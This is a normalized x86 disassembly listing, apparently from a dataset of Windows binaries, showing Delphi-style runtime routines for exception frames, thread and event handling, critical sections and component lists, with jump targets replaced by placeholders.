mov eax [ ebp - 0x4 ]
call sub_421328
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_421328
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42104f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420ff5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40326c
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_40437c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_421220
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41f0d0
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41f0d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ffc
mov eax [ ebp - 0x14 ]
call sub_40331c
retn
sub_420ffc
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_421328
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f0d0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41f0d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40331c
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_4210dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_421122
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404424
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421129
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_421140
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f0d0
mov eax esi
call sub_4045d8
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41f0d0
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_421188
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404524
je r-xdata
mov eax esi
call sub_4043d8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4043d8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f0d0
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41f0d0
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f0d0
mov dl 0x6
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f0d0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41f0d0
sub_421220
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_421265
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405f2c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_421188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42126c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_421274
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42131a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405ddc
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edi eax
mov eax ebx
call sub_404964
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_421328
mov eax ebx
call sub_404964
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41f0d0
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41f0d0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4043a0
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_421188
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421321
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_42133c
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_4213f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
call sub_4213ac
mov eax ebx
call sub_4213b8
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421586
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421567
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42156e
mov eax [ ebp - 0xc ]
call sub_40331c
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418cf8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418be8
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_421531
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_421502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_421598
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_4213d4
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_4215d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_404110
mov eax [ ebp - 0x4 ]
call sub_40331c
sub_4215de
call sub_4027bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_4213d4
test bl bl
je r-xdata
mov eax esi
call sub_404110
mov eax [ ebp - 0x4 ]
call sub_40331c
sub_421640
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_4216ea
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4032ec
call sub_4213e0
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_421598
xor edx edx
xor eax eax
call sub_4040cc
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4216f1
lea eax [ ebp - 0x10 ]
call sub_404118
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40b584
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_421710
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
mov eax [ esi + 0x38 ]
call sub_40331c
call sub_4213ec
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_4219d0
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax esi
call sub_4219d8
mov eax esi
call sub_4219a8
sub_421784
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_4217f2
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4217f9
lea eax [ ebp - 0x14 ]
call sub_404118
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b584
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_421840
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421962
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421944
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_418b9c
call sub_4213d4
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_421925
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42192c
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_421980
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_421840
pop ebp
retn 0x8
sub_4219a8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_421800
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_4219d8
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_421800
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_4213f8
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_421800
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_421a7c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_421c34
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_421ac8
push ebx
push esi
push ecx
call sub_4036d0
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_421d1c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_421cc4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4192c8
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_421c8c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4036b8
lea eax [ ebx + 0x14 ]
call sub_40d814
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418cf8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_421b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418d54
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418b9c
mov edx ebx
mov eax esi
call sub_421b4c
sub_421be0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418b9c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x10 ] eax
sub_421c0c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418e94
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_40331c
xor eax eax
mov [ ebx + 0x10 ] eax
sub_421c34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403518
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_421be0
mov dl 0x1
mov eax ebx
call sub_422154
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_422104
sub_421c8c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_422154
mov edx ebx
mov eax esi
call sub_421c0c
pop edi
pop esi
pop ebx
retn
sub_421cc4
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418de0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_421c8c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_421c0c
sub_421d1c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418cf8
call sub_421d1c
inc edi
dec esi
jne r-xdata
sub_421d58
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418e94
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_40331c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_421d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421d58
mov edx ebx
mov eax esi
call sub_421d58
pop esi
pop ebx
retn
sub_421d98
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_421d7c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418cf8
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_421df4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_421ba0
push ebx
push sub_421bc8
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_421bb4
push ebx
push sub_421bd4
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_421eec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408180
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_421f84
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
sub_421f84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418cf8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408180
test al al
jne r-xdata
sub_421fd4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404524
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_40845c
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
xor edx edx
mov eax ebx
call sub_422154
mov edx esi
mov eax ebx
call sub_422060
mov dl 0x1
mov eax ebx
call sub_422154
sub_422074
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418cf8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418c84
sub_4220b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_418d54
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418be8
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_418d74
sub_422104
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4220a0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_422074
mov cl 0x1
mov edx ebx
call sub_422104
inc edi
dec ebp
jne r-xdata
sub_422154
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4043b4
mov edx esp
mov eax esi
call sub_403618
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_42219c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4221c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_42220c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4033d0
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42226c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_422290
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4222d8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
mov edx esi
call sub_422508
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_422340
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_422508
mov edx ebx
mov eax esi
call sub_4224fc
sub_422384
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov dl 0x1
